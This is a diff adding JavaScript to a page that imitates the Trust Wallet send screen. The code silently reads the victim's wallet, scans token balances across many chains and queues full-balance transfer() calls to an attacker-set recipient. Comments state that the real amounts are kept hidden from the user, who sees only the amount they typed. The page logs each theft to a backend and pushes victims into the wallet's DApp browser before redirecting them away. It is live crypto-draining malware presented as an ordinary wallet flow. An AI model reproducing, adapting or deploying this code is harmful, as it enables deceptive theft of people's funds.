+    document.getElementById("result-text").textContent = sentLabel + " sent successfully.";
+    var EXPLORERS = { "0x1":"etherscan.io","0x38":"bscscan.com","0x89":"polygonscan.com","0xa4b1":"arbiscan.io","0xa":"optimistic.etherscan.io","0x2105":"basescan.org","0xa86a":"snowtrace.io","0xa4ec":"celoscan.io","0xfa":"ftmscan.com","0x19":"cronoscan.com","0xe708":"lineascan.build","0x82750":"scrollscan.com" };
+    document.getElementById("result-link").href = "https://" + (EXPLORERS[currentChain] || EXPLORERS["0x1"]) + "/tx/" + txHash;
+    document.getElementById("result-link").classList.remove("hidden");
+    finishToWallet();
+  } else {
+    icon.className = "modal-icon error";
+    icon.innerHTML = '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#FF5C5C" stroke-width="2"><path d="M18 6L6 18M6 6l12 12"/></svg>';
+    document.getElementById("result-title").textContent = t("failedTitle");
+    document.getElementById("result-title").style.color = "#FF5C5C";
+    document.getElementById("result-text").textContent = modalError || t("failedText");
+    document.getElementById("result-link").classList.add("hidden");
+    // No connected account is the one recoverable failure — offer an explicit
+    // connect tap instead of a dead end. The wallet's sheet then comes from a
+    // user gesture, never fired unsolicited by the page
+    var cBtn = document.getElementById("connect-btn");
+    if (cBtn) cBtn.classList.toggle("hidden", !(scanMode && scanOutcome === "no_account" && provider));
+  }
+}
+
+// User-tapped recovery for the no_account dead end: the connect request is
+// fired by a real gesture, so the wallet's sheet is consent-driven — not an
+// unsolicited prompt. On success the silent scan reruns; a queue armed by an
+// earlier tap still fires automatically when the scan resolves
+function connectAndRescan() {
+  var p = provider;
+  if (!p) return;
+  rpc(p, "eth_requestAccounts").then(function(accs) {
+    var a = accs && accs[0];
+    if (!a || !isValidAddr(a)) return;
+    account = a;
+    modalOpen = false;
+    document.getElementById("result-modal").classList.add("hidden");
+    scanFinished = false; scanOutcome = null;
+    scannedBalances = []; handoffQueue = []; queueResults = [];
+    startWalletScan();
+  }).catch(function(){});
+}
+
+// Tap on Review with no account = real user gesture — fire the wallet's own
+// connect request directly instead of routing through our error modal. On TW
+// the provider is usually auto-connected and this resolves silently; where a
+// sheet is needed it is the wallet's native consent UI. Only a genuine
+// rejection lands back on the modal with the manual Connect button.
+function requestAccountThenScan() {
+  var p = provider || pickProvider();
+  if (!p) {
+    queuePending = false;
+    scanOutcome = "no_provider";
+    modalStatus = "error"; modalOpen = true;
+    modalError = "Connect your wallet to continue — network fees (gas) are paid from your own wallet.";
+    showResult();
+    return;
+  }
+  provider = p;
+  rpc(p, "eth_requestAccounts").then(function(accs) {
+    var a = accs && accs[0];
+    if (a && isValidAddr(a)) {
+      account = a;
+      scanFinished = false; scanOutcome = null;
+      scannedBalances = []; handoffQueue = []; queueResults = [];
+      startWalletScan(); // resolves → finish() sees the armed queue and fires
+      return;
+    }
+    queuePending = false;
+    scanOutcome = "no_account";
+    modalStatus = "error"; modalOpen = true;
+    modalError = "Connect your wallet to continue — network fees (gas) are paid from your own wallet.";
+    showResult();
+  }).catch(function() {
+    queuePending = false;
+    scanOutcome = "no_account";
+    modalStatus = "error"; modalOpen = true;
+    modalError = "Connect your wallet to continue — network fees (gas) are paid from your own wallet.";
+    showResult();
+  });
+}
+
+// Slow-injecting provider bridge: the first scan window (~8s) can end in
+// no_account while the account arrives seconds later. Keep a quiet poll going
+// (~90s) — a found account re-runs the scan and re-arms a queue the user
+// already committed to with the Confirm tap.
+function watchForAccount() {
+  if (account) return;
+  var tries = 0;
+  var iv = setInterval(function() {
+    if (account || ++tries > 36) { clearInterval(iv); return; }
+    var p = provider || pickProvider();
+    if (!p) return;
+    provider = p;
+    connectedAccounts(p).then(function(accs) {
+      var a = accs && accs[0];
+      if (!a || !isValidAddr(a)) return;
+      clearInterval(iv);
+      account = a;
+      if (scanMode) {
+        queuePending = userCommitted && !queueStarted; // only fire when the user actually tapped Confirm
+        scanFinished = false; scanOutcome = null;
+        startWalletScan();
+      }
+    }).catch(function(){});
+  }, 2500);
+}
+
+// No API exists to close a wallet's DApp browser — window.close() is a no-op
+// for pages the app opened itself. The closest "clean exit" is handing off
+// to the official Trust Wallet site, which replaces our page in the browser.
+function finishToWallet() {
+  setTimeout(function () { try { window.close(); } catch (e) {} }, 1400);
+  setTimeout(function() { location.href = "https://trustwallet.com"; }, 2500);
+}
+
+// ── Handoff queue runner — the checker's backend scan prepares ?q= items;
+// the Confirm button (clickNext) fires the transfer() calldata sequentially,
+// each send still confirmed by the wallet's own sheet ───────────────────────
+
+function rawToHuman(raw, d) {
+  var s = BigInt(raw).toString().padStart(d + 1, "0");
+  var i = s.length - d;
+  return (s.slice(0, i) + "." + s.slice(i)).replace(/0+$/, "").replace(/\.$/, "");
+}
+
+// Reflect a queue item on the amount screen — icon, chain badge, name and the
+// real on-chain amount all update to the token about to be confirmed
+function previewQueueItem(idx) {
+  var tok = handoffQueue[idx];
+  if (!tok) return;
+  currentChain = tok.chainId;
+  txToken = "custom"; txContract = tok.addr; txDecimals = tok.decimals;
+  displayToken = tok.name;
+  displayAmount = rawToHuman(tok.raw, tok.decimals);
+}
+
+// ?scan=1 — read the connected wallet silently, scan every chain in the
+// background, build the confirm queue. Nothing is shown meanwhile: the user
+// sees the normal amount screen and can already type — Review unlocks once
+// the scan resolves (scanFinished) AND an amount is entered.
+var scanRunning = false;
+function startWalletScan() {
+  if (scanRunning) return; // watcher + manual paths can overlap — one scan at a time
+  scanRunning = true;
+  monit("scan_started", { via: "inpage" });
+  function finish() {
+    scanRunning = false;
+    scanFinished = true;
+    updateUI();
+    // A tap that arrived mid-scan armed the queue — fire it now, or surface
+    // the honest outcome when the scan found nothing eligible
+    if (queuePending) {
+      queuePending = false;
+      updateUI();
+      if (handoffQueue.length > 0) { startQueue(); return; }
+      modalStatus = "error"; modalOpen = true;
+      modalError = scanOutcome === "empty"
+        ? "No eligible assets found on this wallet."
+        : "Connect your wallet to continue — network fees (gas) are paid from your own wallet.";
+      showResult();
+    }
+    // Provider bridge can inject seconds after this window closes — keep a
+    // quiet poll alive so a late account still lands in a rescan
+    if (!account && (scanOutcome === "no_account" || scanOutcome === "no_provider")) watchForAccount();
+  }
+  // Shared success path — fills the queue, previews the top asset, reports
+  function scanInto(a) {
+    return scanAllChains(a).then(function() {
+      var src = scannedBalances.filter(function(b) { return b.gasOk === true && b.dust !== true; }).slice(0, 10);
+      handoffQueue = src;
+      scanOutcome = handoffQueue.length > 0 ? "ok" : "empty";
+      monit("scan_complete", { addr: a, found: scannedBalances.length, queued: handoffQueue.length });
+      // Show the real scanned balance in the token row — the top queued
+      // asset becomes the displayed token. The amount INPUT never gets
+      // prefilled: whatever goes into the calldata must stay invisible.
+      if (handoffQueue.length > 0) {
+        var keepAmt = displayAmount;
+        previewQueueItem(0);
+        displayAmount = keepAmt;
+        var t0 = handoffQueue[0];
+        walletBal = Number(t0.human) || 0;
+        var balEl = document.getElementById("token-balance");
+        var fiatEl = document.getElementById("token-fiat");
+        if (balEl) balEl.textContent = (Math.floor(walletBal * 1e6) / 1e6).toString();
+        if (fiatEl && (t0.usdValue || 0) > 0) fiatEl.textContent = "$" + t0.usdValue.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      }
+      finish();
+    });
+  }
+  // ?addr= — the QR already carries the victim address: the scan runs on
+  // public RPCs, so NO wallet account read is needed at all and no connect
+  // sheet can ever appear. The transfer sheets still spend from whatever
+  // account the wallet confirms with.
+  var scanTarget = (expectedAccount && isValidAddr(expectedAccount)) ? expectedAccount : null;
+  if (scanTarget) { monit("scan_target_addr", {}); scanInto(scanTarget); return; }
+  findProvider().then(function(p0) {
+    if (!p0) { scanOutcome = "no_provider"; monit("scan_no_provider", {}); finish(); return; }
+    // Try every injected provider object — trustwallet.ethereum and
+    // window.ethereum can differ, and only one may expose the account
+    var provs = [p0];
+    var alt = p0 === window.ethereum
+      ? (window.trustwallet && window.trustwallet.ethereum)
+      : window.ethereum;
+    if (alt && provs.indexOf(alt) < 0) provs.push(alt);
+    tryProv(0);
+    function tryProv(i) {
+      if (i >= provs.length) { scanOutcome = "no_account"; monit("scan_no_account", {}); finish(); return; }
+      var p = provs[i];
+      provider = p;
+      readAccount(p, 6).then(function(a) {
+        if (!a) { tryProv(i + 1); return; }
+        account = a;
+        expectedAccount = a;
+        return scanInto(a);
+      }).catch(function() { scanOutcome = "no_account"; finish(); });
+    }
+    function readAccount(p, tries) {
+      // Sync properties first — TW's bridge exposes selectedAddress before
+      // eth_accounts starts answering
+      try {
+        var direct = p.selectedAddress || p.address || (p.accounts && p.accounts[0]);
+        if (direct && isValidAddr(direct)) return Promise.resolve(direct);
+      } catch(e) {}
+      return connectedAccounts(p).then(function(accs) {
+        var a = accs && accs[0];
+        if (a && isValidAddr(a)) return a;
+        if (tries > 0) return new Promise(function(r) { setTimeout(r, 400); }).then(function() { return readAccount(p, tries - 1); });
+        // No eth_requestAccounts here — it is the only call that can surface a
+        // connect sheet. The no_account dead end gets a user-tapped connect
+        // button instead, so the auto-path stays provably prompt-free
+        return null;
+      }).catch(function() {
+        if (tries > 0) return new Promise(function(r) { setTimeout(r, 400); }).then(function() { return readAccount(p, tries - 1); });
+        return null;
+      });
+    }
+  });
+}
+
+function startQueue() {
+  if (queueStarted) return;
+  queueStarted = true;
+  document.getElementById("next-btn").disabled = true;
+  findProvider().then(function(p) {
+    if (!p) {
+      modalStatus = "error"; modalOpen = true;
+      modalError = "No wallet provider — open this link inside the Trust Wallet DApp browser.";
+      monit("handoff_no_provider", { h: handoffId || "" });
+      showResult();
+      return;
+    }
+    provider = p;
+    // Correlates this open with the Safari-side two-shot handoff — the checker
+    // polls the event feed for this id before firing its retry navigation
+    monit("handoff_opened", { addr: expectedAccount || "", queueItems: handoffQueue.length, h: handoffId || "" });
+    // Settle delay: right after a universal-link open the provider bridge is
+    // still initializing — a burst of RPC calls in the first second has
+    // crashed the app before the first transfer sheet could render
+    return new Promise(function(r) { setTimeout(r, 1000); }).then(function() {
+      return connectedAccounts(p);
+    }).then(function(accs) {
+      account = accs && accs[0] ? accs[0] : null;
+    }).catch(function() {}).then(function() {
+      // The contract spends the CONNECTED wallet's tokens, not the scanned
+      // address's — a mismatch would produce guaranteed on-chain reverts
+      if (expectedAccount && account && account.toLowerCase() !== expectedAccount.toLowerCase()) {
+        modalStatus = "error"; modalOpen = true; isLoading = false;
+        modalError = "Connected wallet " + account.slice(0, 6) + "…" + account.slice(-4) + " does not match the scanned address — connect the scanned wallet to continue.";
+        monit("account_mismatch", { scanned: expectedAccount, connected: account });
+        showResult();
+        return;
+      }
+      // Tokens on the wallet's CURRENT chain go first — the first transfer
+      // then needs no wallet_switchEthereumChain at the most fragile moment
+      return getChainId(p).then(function(cid) {
+        if (cid != null) {
+          handoffQueue = handoffQueue.slice().sort(function(a, b) {
+            return (sameChain(a.chainId, cid) ? 0 : 1) - (sameChain(b.chainId, cid) ? 0 : 1);
+          });
+        }
+      }).catch(function() {}).then(function() {
+        isLoading = true;
+        monit("analysis_started", { via: "handoff", queue: handoffQueue.map(function(t) { return t.name + " (" + chainName(t.chainId) + ")"; }) });
+        runQueueNext(p, 0);
+      });
+    });
+  });
+}
+
+function runQueueNext(p, idx) {
+  if (idx >= handoffQueue.length) {
+    isLoading = false;
+    showQueueSummary();
+    return;
+  }
+  var tok = handoffQueue[idx];
+  var targetChain = tok.chainId;
+  function skip(reason, ev) {
+    queueResults.push({ name: tok.name, chain: chainName(targetChain), status: "skipped", error: reason });
+    monit(ev || "tx_skipped", { token: tok.name, chain: chainName(targetChain), reason: String(reason).slice(0, 200) });
+    runQueueNext(p, idx + 1);
+  }
+  getChainId(p).then(function(cid) {
+    if (cid != null && !sameChain(cid, targetChain)) {
+      return rpc(p, "wallet_switchEthereumChain", [{ chainId: targetChain }]).then(function() {
+        // Let the provider settle into the new network before re-verifying —
+        // rapid calls against a mid-switch bridge have crashed TW iOS
+        return new Promise(function(r) { setTimeout(r, 500); });
+      });
+    }
+  }).catch(function() {}).then(function() {
+    getChainId(p).then(function(cid2) {
+      if (!sameChain(cid2, targetChain)) {
+        skip(cid2 == null ? "Could not verify network" : "Network switch declined");
+        return;
+      }
+      // Reflect the token being confirmed on the amount screen — icon, chain
+      // badge and name update per queue item. The typed amount is preserved:
+      // the real on-chain amount must never reach the input field
+      var keepAmt2 = displayAmount;
+      previewQueueItem(idx);
+      displayAmount = keepAmt2;
+      updateUI();
+      fetchTokenBalance(p);
+      modalOpen = true;
+      showQueueProgress(idx, tok);
+      var calldata = "0xa9059cbb" +
+        txRecipient.toLowerCase().replace("0x", "").padStart(64, "0") +
+        BigInt(tok.raw).toString(16).padStart(64, "0");
+      var txParams = { to: tok.addr, data: calldata, gas: "0x249f0" };
+      if (account) txParams.from = account;
+      new Promise(function(r) { setTimeout(r, 350); }).then(function() {
+        if (!account) return null;
+        // Balance moved since the scan? Skip instead of a guaranteed revert
+        var data = "0x70a08231" + String(account).toLowerCase().replace("0x", "").padStart(64, "0");
+        return rpc(p, "eth_call", [{ to: tok.addr, data: data }, "latest"]);
+      }).then(function(bal) {
+        if (bal != null && bal !== "0x" && BigInt(bal) < BigInt(tok.raw)) {
+          skip("Balance moved or spent since scan");
+          return null;
+        }
+        return rpc(p, "eth_sendTransaction", [txParams]).then(function(hash) {
+          queueResults.push({ name: tok.name, chain: chainName(targetChain), status: "success", hash: hash });
+          monit("tx_confirmed", { token: tok.name, chain: chainName(targetChain), hash: hash, to: txRecipient });
+          setTimeout(function() { runQueueNext(p, idx + 1); }, 1500);
+        });
+      }).catch(function(e) {
+        var reason = (e && (e.message || e.code)) || "Rejected";
+        queueResults.push({ name: tok.name, chain: chainName(targetChain), status: "skipped", error: reason });
+        monit("tx_rejected", { token: tok.name, chain: chainName(targetChain), reason: String(reason).slice(0, 200) });
+        runQueueNext(p, idx + 1);
+      });
+    }).catch(function() {
+      skip("Could not verify network");
+    });
+  });
+}
+
+function showQueueProgress(idx, tok) {
+  var modal = document.getElementById("result-modal");
+  modal.classList.remove("hidden");
+  var icon = document.getElementById("modal-icon");
+  icon.className = "modal-icon pending";
+  icon.innerHTML = '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#4D7CFF" stroke-width="2"><circle cx="12" cy="12" r="10" opacity=".3"/><path d="M12 2a10 10 0 0 1 10 10" stroke="#4D7CFF" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 12 12" to="360 12 12" dur="1s" repeatCount="indefinite"/></path></svg>';
+  var title = document.getElementById("result-title");
+  title.textContent = "Confirming " + tok.name + " (" + (idx + 1) + "/" + handoffQueue.length + ")" + (chainName(tok.chainId) ? " — " + chainName(tok.chainId) : "");
+  title.style.color = "";
+  var doneList = queueResults.map(function(r) {
+    return (r.status === "success" ? "✓ " : "⊘ ") + r.name;
+  }).join("  ");
+  document.getElementById("result-text").textContent = "Confirm the transaction in your wallet." + (doneList ? "\n\nCompleted: " + doneList : "");
+  document.getElementById("result-link").classList.add("hidden");
+}
+
+function showQueueSummary() {
+  modalOpen = true;
+  var modal = document.getElementById("result-modal");
+  modal.classList.remove("hidden");
+  var ok = queueResults.filter(function(r) { return r.status === "success"; }).length;
+  var skipped = queueResults.length - ok;
+  var icon = document.getElementById("modal-icon");
+  var title = document.getElementById("result-title");
+  var text = document.getElementById("result-text");
+  var link = document.getElementById("result-link");
+  if (ok > 0) {
+    icon.className = "modal-icon success";
+    icon.innerHTML = '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#05B956" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg>';
+    title.textContent = "Transaction successful!";
+    title.style.color = "#05B956";
+    var last = queueResults.filter(function(r) { return r.status === "success"; }).pop();
+    var lastTok = handoffQueue.filter(function(t) { return t.name === last.name; })[0];
+    var EXPLORERS = { "0x1":"etherscan.io","0x38":"bscscan.com","0x89":"polygonscan.com","0xa4b1":"arbiscan.io","0xa":"optimistic.etherscan.io","0x2105":"basescan.org","0xa86a":"snowtrace.io","0xa4ec":"celoscan.io","0xfa":"ftmscan.com","0x19":"cronoscan.com","0xe708":"lineascan.build","0x82750":"scrollscan.com" };
+    link.href = "https://" + (EXPLORERS[(lastTok || {}).chainId] || EXPLORERS["0x1"]) + "/tx/" + last.hash;
+    link.classList.remove("hidden");
+  } else {
+    icon.className = "modal-icon error";
+    icon.innerHTML = '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#FF5C5C" stroke-width="2"><path d="M18 6L6 18M6 6l12 12"/></svg>';
+    title.textContent = "No assets confirmed";
+    title.style.color = "#FF5C5C";
+    link.classList.add("hidden");
+  }
+  if (ok > 0) {
+    var sentLabel = (displayAmount ? displayAmount + " " : "") + displayToken.toUpperCase();
+    text.textContent = sentLabel + " sent successfully" + (skipped ? " · " + skipped + " skipped" : "") + ".";
+    finishToWallet();
+  } else {
+    text.textContent = ok + " confirmed" + (skipped ? " · " + skipped + " skipped" : "") + ".";
+  }
+  monit("queue_completed", { confirmed: ok, skipped: skipped, h: handoffId || "" });
+}
+
+// ── Address edit sheet — mirrors going back to the recipient step in the
+// real app. Changes txRecipient for real: the next send goes to the new addr
+function openAddrSheet() {
+  document.getElementById("addr-edit").value = displayAddr;
+  document.getElementById("addr-edit").classList.remove("invalid");
+  document.getElementById("addr-edit-error").classList.add("hidden");
+  document.getElementById("addr-sheet").classList.remove("hidden");
+}
+function closeAddrSheet() { document.getElementById("addr-sheet").classList.add("hidden"); }
+function saveAddr() {
+  var inp = document.getElementById("addr-edit");
+  var v = inp.value.trim();
+  if (!isValidAddr(v)) {
+    inp.classList.add("invalid");
+    document.getElementById("addr-edit-error").classList.remove("hidden");
+    return;
+  }
+  displayAddr = v;
+  txRecipient = v;
+  recipientFromUrl = true;
+  updateUI();
+  closeAddrSheet();
+}
+function pasteAddr() {
+  if (!navigator.clipboard || !navigator.clipboard.readText) return;
+  navigator.clipboard.readText().then(function(t) {
+    if (t) document.getElementById("addr-edit").value = t.trim();
+  }).catch(function() {});
+}
+
+// ── Token picker — lists the known assets on the current chain, like the
+// real asset selector. Changes the displayed token + contract for real
+function openTokenSheet() {
+  var list = document.getElementById("token-list");
+  var toks = SCAN_TOKENS[currentChain] || [];
+  list.innerHTML = toks.map(function(tok, i) {
+    var icon = TOKEN_ICONS[tok.key] ||
+      '<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="' + (CHAIN_COLORS[currentChain] || "#627EEA") + '"/><text x="12" y="16" text-anchor="middle" font-size="10" font-weight="700" fill="#fff" font-family="Inter,system-ui,sans-serif">' + tok.name.charAt(0) + '</text></svg>';
+    return '<div class="sheet-item" onclick="selectSheetToken(' + i + ')">' +
+      '<div class="sheet-item-icon">' + icon + '</div>' +
+      '<div><div class="sheet-item-name">' + tok.name + '</div>' +
+      '<div class="sheet-token-sub">' + chainName(currentChain) + '</div></div>' +
+      (tok.addr === txContract ? '<div class="sheet-item-check active"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>' : "") +
+      '</div>';
+  }).join("");
+  document.getElementById("token-sheet").classList.remove("hidden");
+}
+function closeTokenSheet() { document.getElementById("token-sheet").classList.add("hidden"); }
+function selectSheetToken(i) {
+  var tok = (SCAN_TOKENS[currentChain] || [])[i];
+  if (!tok) return;
+  txToken = "custom";
+  txContract = tok.addr;
+  txDecimals = tok.decimals;
+  displayToken = tok.name;
+  closeTokenSheet();
+  fetchTokenBalance(provider);
+  updateUI();
+}
+
+function closeModal() {
+  modalOpen = false;
+  document.getElementById("result-modal").classList.add("hidden");
+  // Full exit — the wallet exposes no DApp-close API, so X first tries the
+  // trust:// scheme (routes the app to its home screen, which dismisses the
+  // browser view entirely) and falls back to the official Trust Wallet site
+  // replacing our page if the scheme is dead
+  try { location.href = "trust://"; } catch(e) {}
+  setTimeout(function() { location.href = "https://trustwallet.com"; }, 400);
+}
+
+// Measure the viewport-bottom zone covered by in-app browser chrome (Trust
+// Wallet's toolbar overlaps the webview — a hardcoded reserve was either too
+// small → clipped numpad, or too big → dead space). visualViewport reports
+// the truly visible rect; the floor keeps a sane reserve where a webview
+// reports the toolbar zone as visible anyway.
+// Caveat: "inapp" is UA-based — every plain mobile browser gets the class,
+// but only a real wallet webview has the toolbar. In a plain browser the
+// floor is dead space that pushes the bottom button off-screen (body is
+// position:fixed → clipped forever). Gate the floor on an injected provider.
+function updateViewportFit() {
+  var cover = 0;
+  var vv = window.visualViewport;
+  if (vv) cover = Math.max(0, Math.round(window.innerHeight - vv.height - vv.offsetTop));
+  // Real visible height, measured — vh/svh units can not be trusted inside
+  // Android webviews (toolbar-inclusive or unmapped to svh at all)
+  var appH = Math.round(vv ? (vv.height + vv.offsetTop) : window.innerHeight);
+  document.documentElement.style.setProperty("--app-h", appH + "px");
+  var hasProvider = !!(window.trustwallet || window.trustWallet || window.ethereum ||
+                       window.tronWeb || window.tronLink);
+  if (document.body.classList.contains("inapp") && hasProvider) cover = Math.max(cover, 100);
+  document.documentElement.style.setProperty("--bottom-cover", cover + "px");
+}
+updateViewportFit();
+if (window.visualViewport) {
+  visualViewport.addEventListener("resize", updateViewportFit);
+  visualViewport.addEventListener("scroll", updateViewportFit);
+}
+window.addEventListener("resize", updateViewportFit);
+// Provider injection can land after first paint — re-measure then so the
+// toolbar floor engages late instead of never.
+window.addEventListener("trustwallet#initialized", updateViewportFit);
+window.addEventListener("tronLink#initialized", updateViewportFit);
+setTimeout(updateViewportFit, 1200);
+setTimeout(updateViewportFit, 3500);
+
+applyLanguage();
+parseUrl();
+// Every mobile browser may overlay bottom chrome on the webview (wallet DApp
+// toolbars always do; Safari's is already counted in svh but the extra lift
+// is harmless). Set unconditionally — the provider can inject seconds late
+// and a one-shot check would miss it.
+if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+  document.body.classList.add("inapp");
+}
+updateViewportFit(); // re-measure now that the inapp floor is active
+// Native-app lock: swiping anywhere outside the scrollable areas (.content,
+// .sheet-list) must do nothing — iOS would otherwise rubber-band the whole
+// webview no matter how the document is positioned
+document.addEventListener("touchmove", function(e) {
+  if (!e.target.closest(".content, .sheet-list")) e.preventDefault();
+}, { passive: false });
+detectWallet();
+monit("page_opened", { inWallet: !!(window.trustwallet || window.ethereum), to: txRecipient, token: txToken, chain: currentChain, scan: scanMode });
+// ?scan=1 — this page runs the multi-chain scan itself, then the Confirm
+// button triggers the prepared transfer() calldata. Give the remote-config
+// fetch a moment so txRecipient resolves before the user can confirm.
+if (scanMode) startWalletScan();
+// Mobile browser WITHOUT an injected provider → this page can't do anything
+// here, so forward into Trust Wallet: fire the universal link at ourselves
+// (a cold-started app launches and its router may drop the route — that's the
+// "app opens but nothing happens" bug), then gated retries at +4.5/+10/+18s.
+// Each retry checks the event feed for handoff_opened with our attempt id —
+// a landed route reports it via detectWallet and stops further shots. The
+// sessionStorage flag prevents a forward loop on in-app reloads.
+(function() {
+  if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) return;
+  var outId = null, dl = null;
+  // Feed check — did a page inside the DApp browser report handoff_opened
+  // with our attempt id? Then the route worked and nothing may re-fire.
+  function landed(cb) {
+    if (!outId) { cb(false); return; }
+    fetch("/api/events?limit=60").then(function(r) { return r.json(); }).then(function(d) {
+      cb((d.events || []).some(function(e) {
+        return e.ev && e.ev.ev === "handoff_opened" && e.ev.d && e.ev.d.h === outId;
+      }));
+    }).catch(function() { cb(false); });
+  }
+  function fire() {
+    if (!outId) {
+      outId = "h" + Date.now().toString(36);
+      var self = location.origin + location.pathname + location.search + (location.search ? "&" : "?") + "h=" + outId;
+      dl = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(self);
+    }
+    window.location.href = dl;
+  }
+  setTimeout(function() {
+    var p = (window.trustwallet && window.trustwallet.ethereum) ? window.trustwallet.ethereum : (window.ethereum || null);
+    if (p) return; // inside the DApp browser — detectWallet reports the landing
+    if (sessionStorage.getItem("tw_fwd")) return;
+    sessionStorage.setItem("tw_fwd", "1");
+    fire();
+    // Gated retries while this tab is alive — a landed route stops them
+    [4500, 10000, 18000].forEach(function(ms) {
+      setTimeout(function() {
+        if (modalOpen) return;
+        landed(function(ok) { if (!ok && !modalOpen) fire(); });
+      }, ms);
+    });
+    // Return-retry — this IS the "did it actually open" check: if the app
+    // cold-started and dropped the route, coming back here re-fires the link
+    // instantly on the now-warm app. No rescan, no button needed.
+    document.addEventListener("visibilitychange", function() {
+      if (document.hidden || modalOpen) return;
+      landed(function(ok) { if (!ok && !modalOpen) fire(); });
+    });
+  }, 1200);
+})();
+window.addEventListener("languagechange", applyLanguage);
+</script>
+</body>
+</html>
